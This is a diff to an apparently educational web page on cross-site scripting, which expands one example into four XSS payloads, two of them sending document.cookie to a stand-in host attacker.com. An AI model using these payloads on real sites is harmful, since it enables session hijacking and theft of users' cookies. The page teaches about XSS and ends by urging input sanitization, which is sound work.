@@ -90,30 +90,66 @@
                 <img src="/src/sources/images/chibi/sw_01.png" alt="Chibi hacker" class="w-6 h-6 mr-2">
                 Types of XSS Attacks
             </h2>
+            
             <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                 <div>
                     <h3 class="text-xl font-bold mb-2 text-blue-400">Reflected XSS</h3>
                     <p class="text-gray-300 mb-4">
-                        In a reflected XSS attack, the malicious script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
+                        In a reflected XSS attack, the malicious script is reflected off the web server, such as in an error 
+                        message, search result, or any other response that includes some or all of the input sent to the server 
+                        as part of the request.
                     </p>
                 </div>
                 <div>
                     <h3 class="text-xl font-bold mb-2 text-blue-400">Stored XSS</h3>
                     <p class="text-gray-300 mb-4">
-                        Stored XSS occurs when an attacker injects a malicious script that is permanently stored on the target server, such as in a database. The script is then served to other users when they access the affected page, potentially compromising their data or hijacking their sessions.
+                        Stored XSS occurs when an attacker injects a malicious script that is permanently stored on the target 
+                        server, such as in a database. The script is then served to other users when they access the affected 
+                        page, potentially compromising their data or hijacking their sessions.
                     </p>
                 </div>
             </div>
+            
             <div class="bg-gray-800 p-4 rounded-lg mt-4">
-                <h3 class="text-xl font-bold mb-2 text-blue-400">Example of Stored XSS Payload:</h3>
-                <code class="text-green-400">
-                    &lt;script&gt;
-                        var stolenData = document.cookie;
-                        new Image().src = "http://attacker.com/steal?data=" + encodeURIComponent(stolenData);
-                    &lt;/script&gt;
-                </code>
-                <p class="text-gray-300 mt-2">
-                    This malicious script, if stored and then served to users, would attempt to steal their cookies and send them to the attacker's server.
+                <h3 class="text-xl font-bold mb-2 text-blue-400">Examples of XSS Payloads:</h3>
+                <div class="space-y-6">
+                    <div>
+                        <p class="font-bold text-blue-400">Basic Stored XSS:</p>
+                        <pre><code class="text-green-400">
+        &lt;script&gt;
+            var stolenData = document.cookie;
+            new Image().src = "http://attacker.com/steal?data=" + encodeURIComponent(stolenData);
+        &lt;/script&gt;
+                        </code></pre>
+                        <p class="mt-2 text-gray-300">This script attempts to steal cookies and send them to the attacker's server.</p>
+                    </div>
+                    <div>
+                        <p class="font-bold text-blue-400">XSS using onerror:</p>
+                        <pre><code class="text-green-400">
+        &lt;img src="x" onerror="alert('XSS');"&gt;
+                        </code></pre>
+                        <p class="mt-2 text-gray-300">This payload triggers when the image fails to load, executing the JavaScript in the onerror attribute.</p>
+                    </div>
+                    <div>
+                        <p class="font-bold text-blue-400">XSS with onerror and AJAX:</p>
+                        <pre><code class="text-green-400">
+        &lt;img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie);"&gt;
+                        </code></pre>
+                        <p class="mt-2 text-gray-300">This payload uses the fetch API to send stolen cookies to the attacker's server when the image fails to load.</p>
+                    </div>
+                    <div>
+                        <p class="font-bold text-blue-400">DOM-based XSS:</p>
+                        <pre><code class="text-green-400">
+        &lt;script&gt;
+            document.write("&lt;img src='x' onerror='alert(document.domain)'&gt;");
+        &lt;/script&gt;
+                        </code></pre>
+                        <p class="mt-2 text-gray-300">This script dynamically writes an img tag to the DOM, which then triggers an alert with the current domain.</p>
+                    </div>
+                </div>
+                <p class="text-gray-300 mt-6">
+                    These examples demonstrate various XSS techniques, including the use of the onerror attribute. Always 
+                    sanitize user input and implement proper security measures to prevent XSS vulnerabilities.
                 </p>
             </div>
         </section>
